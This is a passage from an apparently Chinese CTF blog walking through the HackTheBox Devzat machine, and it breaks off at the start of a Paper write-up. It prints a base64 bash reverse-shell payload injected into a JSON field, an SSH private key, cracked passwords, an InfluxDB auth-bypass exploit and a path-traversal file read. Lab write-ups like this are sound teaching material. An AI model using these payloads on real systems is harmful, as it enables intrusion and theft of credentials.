 \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.3.1 Kali Exclusive <3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://pets.devzat.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response size: 510\n________________________________________________\n\n.git                    [Status: 301, Size: 41, Words: 3, Lines: 3]\n.git/index              [Status: 200, Size: 3884, Words: 51, Lines: 11]\n.git/config             [Status: 200, Size: 92, Words: 9, Lines: 6]\n.git/HEAD               [Status: 200, Size: 23, Words: 2, Lines: 2]\n.git/logs/              [Status: 200, Size: 63, Words: 3, Lines: 5]\nbuild                   [Status: 301, Size: 42, Words: 3, Lines: 3]\ncss                     [Status: 301, Size: 40, Words: 3, Lines: 3]\nserver-status           [Status: 403, Size: 280, Words: 20, Lines: 10]\n:: Progress: [4686/4686] :: Job [1/1] :: 164 req/sec :: Duration: [0:00:31] :: Errors: 0 ::\n```\n可以看到有一个.git文件，那就是有git备份，下载下来\n\n### GitTools\n> [https://github.com/LucifielHack/GitTools](https://github.com/LucifielHack/GitTools)\n\n使用GitTools给下载下来\n\n```bash\n┌──(root💀kali)-[~/Desktop/GitTools]\n└─# ./Dumper/gitdumper.sh http://pets.devzat.htb/.git/ pets\n###########\n# GitDumper is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n```\n使用gitdumper给dump下来\n\n```bash\n┌──(root💀kali)-[~/Desktop/GitTools]\n└─# ./Extractor/extractor.sh pets ~/Desktop/pets/\n###########\n# Extractor is part of https://github.com/internetwache/GitTools\n#\n# Developed and maintained by @gehaxelt from @internetwache\n#\n# Use at your own risk. Usage might be illegal in certain circumstances. \n# Only for educational purposes!\n###########\n```\n然后使用exractor给解压出来\n\n```bash\n┌──(root💀kali)-[~/Desktop/pets]\n└─# ls -la\n总用量 20\ndrwxr-xr-x 5 root root 4096  2月 19 03:50 .\ndrwxr-xr-x 6 root root 4096  2月 19 03:50 ..\ndrwxr-xr-x 4 root root 4096  2月 19 03:50 0-464614f32483e1fde60ee53f5d3b4d468d80ff62\ndrwxr-xr-x 4 root root 4096  2月 19 03:50 1-ef07a04ebb2fc92cf74a39e0e4b843630666a705\ndrwxr-xr-x 4 root root 4096  2月 19 03:50 2-8274d7a547c0c3854c074579dfc359664082a8f6\n```\n下载可以去本地查看了\n\n### 代码审计\n```go\npackage main\n\nimport (\n        \"embed\"\n        \"encoding/json\"\n        \"fmt\"\n        \"io/fs\"\n        \"io/ioutil\"\n        \"log\"\n        \"net/http\"\n        \"os/exec\"\n        \"time\"\n)\n\n//go:embed static/public\nvar web embed.FS\n\n//go:embed static/public/index.html\nvar index []byte\n\ntype Pet struct {\n        Name            string `json:\"name\"`\n        Species         string `json:\"species\"`\n        Characteristics string `json:\"characteristics\"`\n}\n\nvar (\n        Pets []Pet = []Pet{\n                {Name: \"Cookie\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                {Name: \"Mia\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                {Name: \"Chuck\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                {Name: \"Balu\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                {Name: \"Georg\", Species: \"gopher\", Characteristics: loadCharacter(\"gopher\")},\n                {Name: \"Gustav\", Species: \"giraffe\", Characteristics: loadCharacter(\"giraffe\")},\n                {Name: \"Rudi\", Species: \"redkite\", Characteristics: loadCharacter(\"redkite\")},\n                {Name: \"Bruno\", Species: \"bluewhale\", Characteristics: loadCharacter(\"bluewhale\")},\n        }\n)\n\nfunc loadCharacter(species string) string {\n        cmd := exec.Command(\"sh\", \"-c\", \"cat characteristics/\"+species)\n        stdoutStderr, err := cmd.CombinedOutput()\n        if err != nil {\n                return err.Error()\n        }\n        return string(stdoutStderr)\n}\n\nfunc getPets(w http.ResponseWriter, r *http.Request) {\n        json.NewEncoder(w).Encode(Pets)\n}\n\nfunc addPet(w http.ResponseWriter, r *http.Request) {\n        reqBody, _ := ioutil.ReadAll(r.Body)\n        var addPet Pet\n        err := json.Unmarshal(reqBody, &addPet)\n        if err != nil {\n                e := fmt.Sprintf(\"There has been an error: %+v\", err)\n                http.Error(w, e, http.StatusBadRequest)\n                return\n        }\n\n        addPet.Characteristics = loadCharacter(addPet.Species)\n        Pets = append(Pets, addPet)\n\n        w.WriteHeader(http.StatusOK)\n        fmt.Fprint(w, \"Pet was added successfully\")\n}\n\nfunc handleRequest() {\n        build, err := fs.Sub(web, \"static/public/build\")\n        if err != nil {\n                panic(err)\n        }\n\n        css, err := fs.Sub(web, \"static/public/css\")\n        if err != nil {\n                panic(err)\n        }\n\n        webfonts, err := fs.Sub(web, \"static/public/webfonts\")\n        if err != nil {\n                panic(err)\n        }\n\n        spaHandler := http.HandlerFunc(spaHandlerFunc)\n        // Single page application handler\n        http.Handle(\"/\", headerMiddleware(spaHandler))\n\n        // All static folder handler\n        http.Handle(\"/build/\", headerMiddleware(http.StripPrefix(\"/build\", http.FileServer(http.FS(build)))))\n        http.Handle(\"/css/\", headerMiddleware(http.StripPrefix(\"/css\", http.FileServer(http.FS(css)))))\n        http.Handle(\"/webfonts/\", headerMiddleware(http.StripPrefix(\"/webfonts\", http.FileServer(http.FS(webfonts)))))\n        http.Handle(\"/.git/\", headerMiddleware(http.StripPrefix(\"/.git\", http.FileServer(http.Dir(\".git\")))))\n\n        // API routes\n        apiHandler := http.HandlerFunc(petHandler)\n        http.Handle(\"/api/pet\", headerMiddleware(apiHandler))\n        log.Fatal(http.ListenAndServe(\":5000\", nil))\n}\n\nfunc spaHandlerFunc(w http.ResponseWriter, r *http.Request) {\n        w.WriteHeader(http.StatusOK)\n        w.Write(index)\n}\n\nfunc petHandler(w http.ResponseWriter, r *http.Request) {\n        // Dispatch by method\n        if r.Method == http.MethodPost {\n                addPet(w, r)\n        } else if r.Method == http.MethodGet {\n                getPets(w, r)\n\n        } else {\n                http.Error(w, \"Method not allowed\", http.StatusMethodNotAllowed)\n        }\n        // TODO: Add Update and Delete\n}\n\nfunc headerMiddleware(next http.Handler) http.Handler {\n        return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {\n                w.Header().Add(\"Server\", \"My genious go pet server\")\n                next.ServeHTTP(w, r)\n        })\n}\n\nfunc main() {\n        resetTicker := time.NewTicker(5 * time.Second)\n        done := make(chan bool)\n\n        go func() {\n                for {\n                        select {\n                        case <-done:\n                                return\n                        case <-resetTicker.C:\n                                // Reset Pets to prestaged ones\n                                Pets = []Pet{\n                                        {Name: \"Cookie\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                                        {Name: \"Mia\", Species: \"cat\", Characteristics: loadCharacter(\"cat\")},\n                                        {Name: \"Chuck\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                                        {Name: \"Balu\", Species: \"dog\", Characteristics: loadCharacter(\"dog\")},\n                                        {Name: \"Georg\", Species: \"gopher\", Characteristics: loadCharacter(\"gopher\")},\n                                        {Name: \"Gustav\", Species: \"giraffe\", Characteristics: loadCharacter(\"giraffe\")},\n                                        {Name: \"Rudi\", Species: \"redkite\", Characteristics: loadCharacter(\"redkite\")},\n                                        {Name: \"Bruno\", Species: \"bluewhale\", Characteristics: loadCharacter(\"bluewhale\")},\n                                }\n\n                        }\n                }\n        }()\n\n        handleRequest()\n\n        time.Sleep(500 * time.Millisecond)\n        resetTicker.Stop()\n        done <- true\n}\n```\n发现存在一个main.go的文件，咱们看一下\n\n```go\ncmd := exec.Command(\"sh\", \"-c\", \"cat characteristics/\"+species)\naddPet.Characteristics = loadCharacter(addPet.Species)\n```\n看下这两句，很明显的命令注入。\n\n添加宠物功能点的species直接拼接在cmd中，咱们去构造Exploit\n\n## 漏洞利用\n### Shell\n```bash\necho \"bash -c 'exec bash -i &>/dev/tcp/10.10.14.47/4444 <&1'\" | base64\nYmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==\n\n{\"name\":\"lucifiel\",\"species\":\"cat;echo -n 'YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuNDcvNDQ0NCA8JjEnCg==' | base64 -d | bash\"}\n```\n首先去抓个包\n\n![](Hackthebox-Devzat/4f455f7e-e5a1-4115-a102-7d0088690a18.png)\n\n接着替换exp然后使用nc监听一个端口\n\n```bash\nnc -nvlp 4444\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nc -nvlp 4444        \nlistening on [any] 4444 ...\nconnect to [10.10.14.47] from (UNKNOWN) [10.10.11.118] 33274\nbash: cannot set terminal process group (889): Inappropriate ioctl for device\nbash: no job control in this shell\npatrick@devzat:~/pets$ whoami&&id\nwhoami&&id\npatrick\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\n```\n成功获得一个shell\n\n使用python3获得一个交互式shell\n\n```bash\npython3 -c \"import pty;pty.spawn('/bin/bash')\";\n```\n### User\n在当前用户patrick目录下存在ssh秘钥\n\n```bash\ncat /home/.ssh/id_rsa\n```\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# chmod 700 id_rsa\n\n┌──(root💀kali)-[~/Desktop]\n└─# ssh patrick@10.10.11.118 -i id_rsa        \nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat 19 Feb 2022 09:20:45 AM UTC\n\n  System load:  0.01              Processes:                243\n  Usage of /:   55.8% of 7.81GB   Users logged in:          1\n  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1\n  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118\n\n107 updates can be applied immediately.\n33 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sat Feb 19 09:18:30 2022 from 10.10.16.23\n```\n成功登录ssh\n\n```bash\npatrick@devzat:~$ whoami&&id\npatrick\nuid=1000(patrick) gid=1000(patrick) groups=1000(patrick)\n```\n### 端口转发\n```bash\npatrick@devzat:~$ ss -tunlp\nNetid             State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port             Process                                       \nudp               UNCONN              0                   0                                127.0.0.53%lo:53                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                             127.0.0.53%lo:53                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:8086                                0.0.0.0:*                                                              \ntcp               LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:8443                                0.0.0.0:*                                                              \ntcp               LISTEN              0                   4096                                 127.0.0.1:5000                                0.0.0.0:*                 users:((\"petshop\",pid=908,fd=3))             \ntcp               LISTEN              0                   511                                          *:80                                        *:*                                                              \ntcp               LISTEN              0                   128                                       [::]:22                                     [::]:*                                                              \ntcp               LISTEN              0                   4096                                         *:8000                                      *:*                 users:((\"devchat\",pid=907,fd=7))\n```\n这里我们把8086端口转发出去\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ssh -L 8086:127.0.0.1:8086 patrick@10.10.11.118 -i id_rsa \nWelcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sat 19 Feb 2022 09:30:33 AM UTC\n\n  System load:  0.0               Processes:                246\n  Usage of /:   55.8% of 7.81GB   Users logged in:          1\n  Memory usage: 23%               IPv4 address for docker0: 172.17.0.1\n  Swap usage:   0%                IPv4 address for eth0:    10.10.11.118\n\n107 updates can be applied immediately.\n33 of these updates are standard security updates.\nTo see these additional updates run: apt list --upgradable\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nLast login: Sat Feb 19 09:20:46 2022 from 10.10.14.47\n```\n成功转发出来\n\n### Nmap\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -p 8086 -sC -sV 127.0.0.1                      \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-19 04:33 EST\nNmap scan report for localhost (127.0.0.1)\nHost is up (0.000048s latency).\n\nPORT     STATE SERVICE VERSION\n8086/tcp open  http    InfluxDB http admin 1.7.5\n|_http-title: Site doesn't have a title (text/plain; charset=utf-8).\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 12.82 seconds\n```\n### Exploit\n这里发现是InfluxDB，去搜索一下是否有相关的漏洞\n\n> [https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933)\n\n使用该Exploit进行攻击\n\n```bash\ngit clone https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933.git\ncd InfluxDB-Exploit-CVE-2019-20933\npip install -r requirements.txt\n```\n下载安装所需要的环境\n\n然后执行\n\n```bash\n┌──(root💀kali)-[~/Desktop/InfluxDB-Exploit-CVE-2019-20933]\n└─# python3 __main__.py\n\n  _____        __ _            _____  ____    ______            _       _ _   \n |_   _|      / _| |          |  __ \\|  _ \\  |  ____|          | |     (_) |  \n   | |  _ __ | |_| |_   ___  __ |  | | |_) | | |__  __  ___ __ | | ___  _| |_ \n   | | | '_ \\|  _| | | | \\ \\/ / |  | |  _ <  |  __| \\ \\/ / '_ \\| |/ _ \\| | __|\n  _| |_| | | | | | | |_| |>  <| |__| | |_) | | |____ >  <| |_) | | (_) | | |_ \n |_____|_| |_|_| |_|\\__,_/_/\\_\\_____/|____/  |______/_/\\_\\ .__/|_|\\___/|_|\\__|\n                                                         | |                  \n                                                         |_|                  \n - using CVE-2019-20933\n\nHost (default: localhost): \nPort (default: 8086): \nUsername <OR> path to username file (default: users.txt): \n\nBruteforcing usernames ...\n[v] admin\n\nHost vulnerable !!!\n\nDatabases:\n\n1) devzat\n2) _internal\n\n.quit to exit\n[admin@127.0.0.1] Database: devzat\n\nStarting InfluxDB shell - .back to go back\n[admin@127.0.0.1/devzat] $ SELECT * FROM \"user\"\n{\n    \"results\": [\n        {\n            \"series\": [\n                {\n                    \"columns\": [\n                        \"time\",\n                        \"enabled\",\n                        \"password\",\n                        \"username\"\n                    ],\n                    \"name\": \"user\",\n                    \"values\": [\n                        [\n                            \"2021-06-22T20:04:16.313965493Z\",\n                            false,\n                            \"WillyWonka2021\",\n                            \"wilhelm\"\n                        ],\n                        [\n                            \"2021-06-22T20:04:16.320782034Z\",\n                            true,\n                            \"woBeeYareedahc7Oogeephies7Aiseci\",\n                            \"catherine\"\n                        ],\n                        [\n                            \"2021-06-22T20:04:16.996682002Z\",\n                            true,\n                            \"RoyalQueenBee$\",\n                            \"charles\"\n                        ]\n                    ]\n                }\n            ],\n            \"statement_id\": 0\n        }\n    ]\n}\n```\n### Catherine\n在ssh中使用su切换到catherine用户\n\n```bash\nusername = catherine\npassword = woBeeYareedahc7Oogeephies7Aiseci\n```\n```bash\ncatherine@devzat:~$ ls\ndev  devzat-dev.zip  devzat-main.zip  main  user.txt\ncatherine@devzat:~$ cat user.txt \na45f55a41f9cd103ea222c1e00466341\n```\n成功拿到user权限的flag文件\n\n## 权限提升\n```bash\ncatherine@devzat:/var/backups$ ls\napt.extended_states.0  apt.extended_states.1.gz  apt.extended_states.2.gz  devzat-dev.zip  devzat-main.zip\n```\n在/var/backups目录中有两个zip文件，我们copy出来解压出来看看\n\n```bash\ncatherine@devzat:/tmp/lucifiel$ ls\ndev  devzat-dev.zip  devzat-main.zip  main\n```\n```bash\ncatherine@devzat:/tmp/lucifiel$ diff main/commands.go dev/commands.go\n3a4\n>       \"bufio\"\n4a6,7\n>       \"os\"\n>       \"path/filepath\"\n36a40\n>               file        = commandInfo{\"file\", \"Paste a files content directly to chat [alpha]\", fileCommand, 1, false, nil}\n38c42,101\n<       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode}\n---\n>       commands = []commandInfo{clear, message, users, all, exit, bell, room, kick, id, _commands, nick, color, timezone, emojis, help, tictactoe, hangman, shrug, asciiArt, exampleCode, file}\n> }\n> \n> func fileCommand(u *user, args []string) {\n>       if len(args) < 1 {\n>               u.system(\"Please provide file to print and the password\")\n>               return\n>       }\n> \n>       if len(args) < 2 {\n>               u.system(\"You need to provide the correct password to use this function\")\n>               return\n>       }\n> \n>       path := args[0]\n>       pass := args[1]\n> \n>       // Check my secure password\n>       if pass != \"CeilingCatStillAThingIn2021?\" {\n>               u.system(\"You did provide the wrong password\")\n>               return\n>       }\n> \n>       // Get CWD\n>       cwd, err := os.Getwd()\n>       if err != nil {\n>               u.system(err.Error())\n>       }\n> \n>       // Construct path to print\n>       printPath := filepath.Join(cwd, path)\n> \n>       // Check if file exists\n>       if _, err := os.Stat(printPath); err == nil {\n>               // exists, print\n>               file, err := os.Open(printPath)\n>               if err != nil {\n>                       u.system(fmt.Sprintf(\"Something went wrong opening the file: %+v\", err.Error()))\n>                       return\n>               }\n>               defer file.Close()\n> \n>               scanner := bufio.NewScanner(file)\n>               for scanner.Scan() {\n>                       u.system(scanner.Text())\n>               }\n> \n>               if err := scanner.Err(); err != nil {\n>                       u.system(fmt.Sprintf(\"Something went wrong printing the file: %+v\", err.Error()))\n>               }\n> \n>               return\n> \n>       } else if os.IsNotExist(err) {\n>               // does not exist, print error\n>               u.system(fmt.Sprintf(\"The requested file @ %+v does not exist!\", printPath))\n>               return\n>       }\n>       // bokred?\n>       u.system(\"Something went badly wrong.\")\n```\n这里获得了一个密码CeilingCatStillAThingIn2021?，同时分析代码后知道了存在可控的文件读取功能，通过控制第一个参数控制路径，通过控制第二个参数pass绕过检测\n\n```bash\nssh -l test localhost -p 8443\n```\n```bash\ncatherine@devzat:/tmp/lucifiel$ ssh -l test localhost -p 8443\n                                                                                                                                                                                                  13 minutes earlier\ndevbot: catherine has joined the chat\n                                                                                                                                                                                                  12 minutes earlier\ncatherine: all\n                                                                                                                                                                                                    1 minute earlier\ndevbot: test has joined the chat \ntest: file ../../../../root/root.txt CeilingCatStillAThingIn2021?\ncatherine: close\ndevbot: test has left the chat \ndevbot: test stayed on for 1 minute \ncatherine: exit\nWelcome to the chat. There is one more user\ndevbot: test has joined the chat\ntest: /file ../../../../root/root.txt CeilingCatStillAThingIn2021?\n[SYSTEM] c2b07bb41d02e2c880a4d1c9469d13ef\n```\n成功获得root权限的flag文件","tags":["Hackthebox"]},{"title":"Paper - Hackthebox","url":"/2022/02/19/Hackthebox/Easy/Hackthebox-Paper/","content":"\n# Hackthebox - Paper\n## 靶场信息\n![](Hackthebox-Paper/b01ad57e-532f-4607-9439-8e61ddf6015a.png)\n\n## 靶场类型\n![](Hackthebox-Paper/256d4bc5-a248-4c39-a06c-c3a6afadbbc6.png)\n\n## 信息搜集\n### nmap\n首先使用nmap进行信息搜集\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.143\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-02-18 22:29 EST\nNmap scan report for 10.10.11.143\nHost is up (0.24s latency).\nNot shown: 65532 closed ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)\n| ssh-hostkey: \n|   2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)\n|   256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)\n|_  256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)\n|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n|_http-title: HTTP Server Test Page powered by CentOS\n| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US\n| Subject Alternative Name: DNS:localhost.localdomain\n| Not valid before: 2021-07-03T08:52:34\n|_Not valid after:  2022-07-08T10:32:34\n|_ssl-date: TLS randomness does not represent time\n| tls-alpn: \n|_  http/1.1\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.91%E=4%D=2/18%OT=22%CT=1%CU=36529%PV=Y%DS=2%DC=T%G=Y%TM=6210646\nOS:8%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1\nOS:1NW7%O6=M505ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN\nOS:(R=Y%DF=Y%T=40%W=7210%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\n\nTRACEROUTE (using port 53/tcp)\nHOP RTT       ADDRESS\n1   239.51 ms 10.10.14.1\n2   239.64 ms 10.10.11.143\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 56.23 seconds\n```\n### Http\n![](Hackthebox-Paper/45c48f81-2c45-45cd-af04-81b9e5f32c5d.png)\n\n查看80端口的Http页面，发现是一个nginx的默认页面\n\n暂时没什么可看的，去看看响应包吧\n\n![](Hackthebox-Paper/9ef66497-38ed-4b23-83ef-02ba7acbfed1.png)\n\n在响应包中看到了一个域名office.htb\n\n去加入到hosts里\n\n```bash\necho 10.10.11.143 office.paper\n```\n![](Hackthebox-Paper/add1edb1-9622-4703-a293-46e854fc1fff.png)\n\n访问后可以看到是一个wordpress搭建的\n\n使用wpscan扫描看看\n\n### Wpscan\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# wpscan --url http://office.paper/\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ ®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.17\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: http://office.paper/ [10.10.11.143]\n[+] Started: Fri Feb 18 22:59:11 2022\n\nInteresting Finding(s):\n\n[+] Headers\n | Interesting Entries:\n |  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9\n |  - X-Powered-By: PHP/7.2.24\n |  - 